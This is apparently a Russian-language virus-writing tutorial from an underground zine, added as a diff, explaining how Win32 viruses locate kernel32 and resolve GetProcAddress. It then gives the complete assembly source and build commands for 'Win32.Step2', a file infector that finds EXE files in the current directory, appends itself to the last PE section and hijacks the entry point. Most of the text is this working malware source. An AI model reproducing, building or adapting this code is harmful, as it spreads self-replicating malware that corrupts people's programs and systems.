@@ -1,0 +1,417 @@
+          
+ █│█│█▀█│█▄▄ ▀┘▀█▀┘█▀█│▀█▀┘  █│█│    Win32: Следующий шаг
+ █▀█│█▀█│█▄█│█│ █│ █▀█│ █│   ▀▀█│    ~~~~~~~~~~~~~~~~~~~~          by NeKr0!
+─────────────────────────────────
+   Итак, надеюсь вы разобрались с примером из прошлого выпуска и хотите еще.
+Да будет вам еще! Сегодня  расcказ о том, как устроены стандартные вин32 вири
+заражающие PE EXE.
+   Начнем-с... Первым делом надо узнать куда нас занесло, т.е. узнать дельту
+для правильной адресации внутри себя. Дальше нам потребуются API-функции, чтоб
+мы могли хоть что-то сделать. Но Винда нам их не даст, поэтому либо будем их 
+искать сами, либо будем искать сами :) одну функцию GetProcAddress. Функция эта
+крайне полезна, ее задача в том, чтобы предаставлять нам адрес точки входа в 
+любую запрошенную нами функцию Kernel'a. Делаем это так:
+ 1. Для начала нам нужно найти базовый адрес Kernel'a
+ 2. Из PE заголовка находим адрес таблицы экспортов
+ 3. В таблице экспортов узнаем кол-во указателей на ф-ции, расположение таблицы
+    указателей имен и адрес таблицы ординалов
+ 4. Перебираем указатели (и ординалы), проверяя при этом имена ф-ций на которые 
+    они указывают на совпадение с "GetProcAddress"
+ 5. При совпадении возьмем ординал и по таблице адресов получим адрес ф-ции.
+    (структуру полей заголовка я описывать не буду, смотрите в архив - там
+     описание от HardWisdom'a (надеюсь он не обидется:)                    )
+Вот описание ф-ции GetProcAddress:
+FARPROC GetProcAddress(
+    HMODULE hModule,	// указатель на адрес DLL в памяти
+    LPCSTR lpProcName 	// указатель на имя функции 
+   );
+Возвращаемые значения: Если все ок - адрес функции
+		       Если ошибка - 0
+А юзать GetProcAddress будем так - сделаем подпрограмму, в которую будем 
+передавать адрес имени нужной нам ф-ции, потом используя найденный базовый
+адрес Kernel'a узнаем точку входа в ф-цию и сделаем jmp по этому адресу 
+(т.к. в стеке у нас остался адрес выхода из подпрограммы).
+Вот и пример на это - сделаем MessageBoxA своими силами
+Пример максимально приближен к вирусному коду :) но не размножается :)
+=====================[Кут хере]==============================================
+.486p
+.model flat
+
+extrn ExitProcess:proc			;Это чтоб программа работала
+					;хотя это и не используется
+.data
+virus:					;Начало
+	call delta			;Получим дельту
+delta:
+	pop ebp
+	sub ebp, offset delta
+	mov ebx,[esp]			;Возьмем из стека адрес Kernel'a
+	xor bx,bx			;И найдем его начало
+next_block:
+	cmp word ptr [ebx],'ZM'		;Начало?
+	je found_MZ			;ДА!
+	sub ebx,1000h			;Ищем дальше
+	jmp next_block
+found_MZ:				
+	mov edx,ebx			;сохраним указатель
+	mov edi,dword ptr [ebx+3Ch]	;адрес PE заголовка
+	add edi,edx			;+адрес kernel'a
+	cmp word ptr [edi],'EP'		;проверка на PE
+	jne Exit			;не равно - выходим
+	mov 4 ptr [KernelAddr+ebp],edx	;сохраним базовый адрес kernel'a
+	add ebx,[edi+78h] 		;Получим адрес таблицы экспортов
+	mov ecx,[ebx+18h] 		;Количество указателей
+	mov esi,[ebx+20h] 		;Указатель на таблицу указателей имен
+	mov edi,[ebx+24h] 		;Указатель на таблицу ординалов
+	add esi,edx			;адр. таблицы имен в памяти
+	add edi,edx			;адр. таблицы ординалов в памяти
+	cld				;поиск вперед
+Search:					;Ищем функцию GetProcAddress
+	lodsd				;берем указатель из таблицы указателей 
+	add eax, edx			;получаем адрес памяти
+	push ecx			;сохраним кол-во указателей
+	push edi			;сохраним указатель на ординалы
+	xchg esi, eax			;в esi указетль на имя найденной ф-ции
+	lea edi, [GetProcAddress+ebp]	;Указываем на имя нужной нам фунции
+	mov ecx, GetProcSize		;Размер строки
+	repe cmpsb			;сравниваем
+	xchg esi, eax			;восстановим значение esi
+	pop edi				;восстановим указатель на ординалы
+	pop ecx				;восстановим кол-во указателей
+	je Found			;нашли!
+	inc edi				;нет - пробуем следующую ф-цию
+	inc edi				;указатель на следующий ординал
+	loop Search
+	jmp Exit
+Found:
+	xor eax,eax
+	mov ax, word ptr [edi]		;возьмем ординал
+	shl eax, 2			;умножим на размер ординала
+	mov esi, [ebx+1Ch]		;указатель на таблицу адресов
+	add esi, edx			;получим адрес начала таблицы адресов
+	add esi, eax			;и адрес нужной ф-ции
+	lodsd				;прочитаем
+	add eax, edx			;добавим адрес kernel'a
+	mov 4 ptr [GetProcAddr+ebp],eax ;сохраним
+
+	lea eax,offset [LibName+ebp]	;загрузим User32.dll чтоб получить
+	push eax			;адрес MessageBoxA
+	lea eax,offset [LoadLib+ebp]
+	call kernelAPIfunc
+	mov 4 ptr [user32addr+ebp],eax	;в eax адрес загрузки dll
+
+	push 0				;подготовим параметры MessageBoxA
+	lea eax,[Titl+ebp]		;заголовок окна
+	push eax
+	lea eax,[Msg+ebp]		;текст в окне
+	push eax
+	push 0
+	lea eax,[MessageBox+ebp]
+	call user32APIfunc		;вызовем окошко
+	push 0
+	lea eax,[ExitProc+ebp]		;ну и выйдем напоследок
+	call kernelAPIfunc
+Exit:	ret
+
+kernelAPIfunc:				;Процедура вызова ф-ций Kernel'a
+	push eax
+KernelAddr equ $+1
+	mov eax,0
+	push eax
+GetProcAddr equ $+1
+	mov eax,0
+	call eax
+	jmp eax
+
+user32APIfunc:				;Процедура вызова ф-ций User32.dll
+	push eax
+user32Addr equ $+1
+	mov eax,0
+	push eax
+	mov eax,4 ptr [GetProcAddr+ebp]
+	call eax
+	jmp eax
+
+Titl	db 'API Test window',0
+Msg	db 'it work!',0
+
+GetProcAddress	db	'GetProcAddress',0
+GetProcSize	equ 	$-GetProcAddress
+LoadLib		db	'LoadLibraryA',0
+LibName		db	'USER32.DLL',0
+MessageBox	db	'MessageBoxA',0
+ExitProc	db	'ExitProcess',0
+.code					;Кодовая секция
+start:
+	jmp virus			;Переходим на наш код
+	push 0				;А сюда управление не попадет никогда
+	call ExitProcess		;Выхода нет :)
+end start
+=====================[Кут хере]==============================================
+   Возможно вы скажете: "Че за хрень? Какие нахрен окошки? Где вирус?". Но без
+понимания основ MessageBoxA невозможен ни один вирус :) Спокойствие, только 
+спокойствие (с) Карлсон, идем дальше.
+   Поиск в текущем каталоге я надеюсь вы освоили (если нет см. Habitat #3).
+Тогда начнем искать ЕХЕ файлы, а я буду вам объяснять как их все таки заразить.
+Для нашего вируса нам понадобятся следующие функции кернела:
+GetProcAddress,CreateFileA,FindFirstFileA,FindNextFileA,SetFilePointer,ReadFile
+WriteFile и CloseHandle. Проверку на зараженность будем определять по контроль-
+ной сумме PE-заголовка, заражать будем в последнюю секцию, предварительно увели-
+чив ее размер и выставив ей аттрибуты запись_разрешена/исполняемая_секция. Файлы
+будем искать в текущем каталоге. Описание всех структур PE-EXE вы найдете в при-
+ложении. Вот как это компиляется:
+=====================[Кут хере]==============================================
+tasm32.exe /mx /m3 virus.asm,,;
+tlink32.exe /Tpe /aa /c /v virus.obj,,, import32.lib,
+=====================[Кут хере]==============================================
+А вот и сам исходник:
+=====================[Кут хере]==============================================
+.386					;Начнемс
+.model	flat
+extrn		MessageBoxA:proc	;Процедуры для первого запуска
+extrn		ExitProcess:proc
+
+.code
+Start:					;Типа инфицированная прога
+	push 0
+	push offset Zag
+	push offset Message
+	push 0
+	call MessageBoxA
+	push 0
+	call ExitProcess
+Zag	db ' [Win32.Step2]',0
+Message	db ' Virus was started...',0
+
+.data					;Здесь начинаемся мы
+Virus:					
+	pushad				;Сохраним все регистры
+	call Delta
+Delta:					;Получаем дельту
+	pop ebp
+	sub ebp, offset delta	
+
+RetAddress equ $+1                      ;Сохраняем в стеке адрес возврата 
+        push 0FFFFED79h                 ;в программу-носитель
+                                        ;(Адрес метки Start)
+        mov ebx, [esp+24h]              ;Ищем адрес KERNEL32 в памяти
+        xor bx, bx                      ;Это я уже объяснял :)
+next_block:
+	cmp [ebx], 2 ptr 'ZM'
+	je found_MZ
+	sub ebx, 1000h
+	jmp next_block
+found_MZ:
+	mov edx, ebx
+	mov esi, [ebx+3Ch]
+	add esi, ebx
+	cmp [esi], 4 ptr 'EP'
+	jne Exit
+	mov 4 ptr [KernelAddr+ebp], edx
+	add ebx, [esi+78h]
+	mov ecx, [ebx+18h]
+	mov esi, [ebx+20h]
+	mov edi, [ebx+24h]
+	add esi, edx
+	add edi, edx
+	cld
+Search:
+	lodsd
+	add eax, edx
+	push ecx
+	push edi
+	xchg esi, eax
+	lea edi, [GetProcAddress+ebp]
+	mov ecx, GetProcSize
+	repe cmpsb
+	xchg esi, eax
+	pop edi
+	pop ecx
+	je Found
+	inc edi
+	inc edi
+	loop Search
+	jmp Exit
+Found:
+	xor eax,eax
+	mov ax, 2 ptr [edi]
+	shl eax, 2
+	mov esi, [ebx+1Ch]
+	add esi, edx
+	add esi, eax
+	lodsd
+	add eax, edx
+	mov 4 ptr [GetProcAddr+ebp], eax
+FindFirst:				;Начинаем поиск файлов
+	lea eax, [SearchRec+ebp]	;Указатель на структуру поиска
+	push eax
+	lea eax, [EXEmask+ebp]		;Маска поиска
+	push eax
+	lea eax, [FindFirstFileA+ebp]
+	call APIfunc
+	cmp eax, -1			;Ошибка?
+	je Exit
+	mov [SearchHandle+ebp], eax	;Сохраним хендл поиска
+                                        
+Infect:
+        xor eax, eax			;Все ненужные параметры заполним нулем
+	push eax
+	push eax
+	push 3				;Открыть существующий
+	push eax
+	push eax			
+	push 0C0000000h			;Доступ к файлу (Чтение+запись)
+	lea eax, [ff_FullName+ebp]	;Имя найденного файла
+	push eax
+	lea eax, [CreateFileA+ebp]	
+	call APIfunc			;Откроем файл
+	cmp eax, -1			;Ошибка?
+	je FindNext			;Если да - ищем следующий
+	mov ebx, eax			;Сохраним хендл файла
+        mov eax, 3Ch                    ;Установим указатель в файле на 
+        call Seek                       ;смещение 3Ch
+        mov ecx, 4                      ;Сколько байт читать
+        lea edx, [PEofs+ebp]	        ;Куда читать
+        call Read                       ;Считаем указатель на PE-заголовок
+	mov eax, [PEofs+ebp]		;Возьмем его
+	call Seek			;Передвинем файловый указатель
+	mov ecx, PEsize		;Размер PE-заголовка
+	lea edx, [Header+ebp]		;Куда читать
+        call Read                       ;Считываем PE заголовок
+	cmp 2 ptr [Header+ebp],'EP'	;Проверка на PE-файл
+	jne Close			;Нет - уходим
+	cmp 4 ptr [Header+58h+ebp],'petS' ;Проверка на зараженность
+	je Close			;Да - уходим
+	xor eax, eax			;Вычислим смещение последнего элемента
+	imul ax, 2 ptr [Header+06h+ebp], ObjectSize ;в таблице объектов
+	add ax, 2 ptr [Header+14h+ebp]	;
+	add ax, 18h-ObjectSize
+	add eax, [PEofs+ebp]
+	mov [ObjectOfs+ebp], eax
+	call Seek			;И считаем его
+	mov ecx, ObjectSize		;Сколько считывать
+	lea edx, [Object+ebp]		;Куда считывать
+	call Read
+	mov eax, 4 ptr [Object+10h+ebp] ;Физический размер секции
+	cmp 4 ptr [Object+08h+ebp], eax ;Сравним с виртуальным размером
+	jae its_big			;Если >= то вычислим новый размер
+	mov 4 ptr [Object+08h+ebp], eax ;Иначе уравняем их
+its_big:
+	add eax, 4 ptr [Object+0Ch+ebp] ;Добавим адрес секции в памяти
+	mov ecx, 4 ptr [Header+28h+ebp]	;Точка входа
+	sub ecx, eax
+	sub ecx, RetAddr+4-Virus
+	mov 4 ptr [RetAddress+ebp], ecx ;Сохраним старую точку входа
+	mov 4 ptr [Header+28h+ebp], eax	;И поставим новую
+	add eax, VirSize		;Увеличим на наш размер
+	mov 4 ptr [Header+50h+ebp], eax	;Ставим новый размер файла
+        				;Получим смещение, куда записать вирус
+	mov eax, 4 ptr [Object+14h+ebp]	;Физическое смещение от начала EXE
+	add eax, 4 ptr [Object+10h+ebp]	;Размер секции в файле
+	call Seek			;Передвигаем указатель
+	add 4 ptr [Object+08h+ebp], VirSize ;Увеличим виртуальный размер секции
+	add 4 ptr [Object+10h+ebp],CodeSize ;И физический размер
+	or 4 ptr [Object+24h+ebp],0A0000020h ;Установим аттрибуты записи
+	mov 4 ptr [Header+58h+ebp],'petS' ;Поставим нашу метку
+	mov ecx, CodeSize		;Сколько нашего кода записать
+	lea edx, [Virus+ebp]		;И откуда его писать
+	call Write			;Запишем
+	mov eax, [PEofs+ebp]		;Вспомним где PE-заголовок
+	call Seek			;Передвинемся на него
+	mov ecx, PEsize			;Размер заголовка
+	lea edx, [Header+ebp]		;Его адрес
+	call Write			;Ну и запишем его
+;[Записываем последний элемент таблицы объектов]
+	mov eax, [ObjectOfs+ebp]	;Где таблица объектов
+	call Seek			;Передвинемся на нее
+	mov ecx, ObjectSize		;Размер таблицы
+	lea edx, [Object+ebp]		;Указатель на наш вариант таблицы
+	call Write			;Обновим таблицу
+Close:
+	push ebx			;Хендл файла
+	lea eax, [CloseHandle+ebp]	
+	call APIfunc			;Закроем его
+FindNext:				;И будем искать следующий
+	lea eax, [SearchRec+ebp]	;Укажем на структуру поиска
+	push eax
+	push 4 ptr [SearchHandle+ebp]	;Хэндл поиска
+	lea eax, [FindNextFileA+ebp]
+	call APIfunc
+	or eax, eax			;Кончились файлы?
+	jnz Infect			;Нет - заразим их
+Exit:					;А если да, то выйдем
+	pop dword ptr [RetAddr+ebp]	;Вспомним куда отдать управление
+	popad				;Восстановим регистры
+RetAddr	equ $+1
+	jmp start			;Сам живи и другим давай :)
+Seek:
+	push 0
+	push 0
+	push eax
+	lea eax, [SetFilePointer+ebp]
+	jmp exec_func
+Read:
+	lea eax, [ReadFile+ebp]
+	jmp go_go
+Write:
+	lea eax, [WriteFile+ebp]
+go_go:
+	push 0
+	lea edi, [Bytes+ebp]		;Счетчик байтов записанных/прочитанных
+	push edi
+	push ecx
+	push edx
+exec_func:
+	push ebx
+	call APIfunc
+	ret 
+APIfunc:	
+	push eax
+KernelAddr equ $+1
+	mov eax,0
+	push eax
+GetProcAddr equ $+1
+	mov eax,0
+	call eax
+	jmp eax
+
+VirName	db '[Win32.Step2 by NeKr0!]'
+PEsize equ 5Ch				;Размер PE-заголовка
+ObjectSize equ 28h			;Размер таблицы объектов
+GetProcAddress	db 'GetProcAddress',0
+GetProcSize equ $-GetProcAddress	;Размер строки в байтах
+CreateFileA	db 'CreateFileA',0
+FindFirstFileA	db 'FindFirstFileA',0
+FindNextFileA	db 'FindNextFileA',0
+SetFilePointer	db 'SetFilePointer',0
+ReadFile	db 'ReadFile',0
+WriteFile	db 'WriteFile',0
+CloseHandle	db 'CloseHandle',0
+EXEmask		db '*.EXE',0
+CodeSize equ $ - Virus
+
+PEofs		dd ?			;Смещение PE-заголовка в файле
+ObjectOfs	dd ?			;Смещение таблицы объектов в файле
+SearchHandle	dd ?			;Хендл поиска
+Bytes		dd ?			;Счетчик байт
+Object		db ObjectSize dup (?)	;Место под таблицу объектов
+Header		db PEsize dup (?)	;Место под PE-заголовок
+SearchRec:				;Струтура для поиска файлов
+ff_attr			dd ?
+ff_create_time		dd ?
+			dd ?
+ff_last_access_time     dd ?
+               	        dd ?
+ff_last_write_time      dd ?
+       	                dd ?
+ff_file_size_high       dd ?
+ff_file_size_low        dd ?
+ff_reserved             dd ?
+       	                dd ?
+ff_fullname             db 260 dup (?)
+ff_dosname              db 14 dup (?) 
+
+VirSize	equ $ - Virus
+end Virus
+;Вот вроде и все
+=====================[Кут хере]==============================================
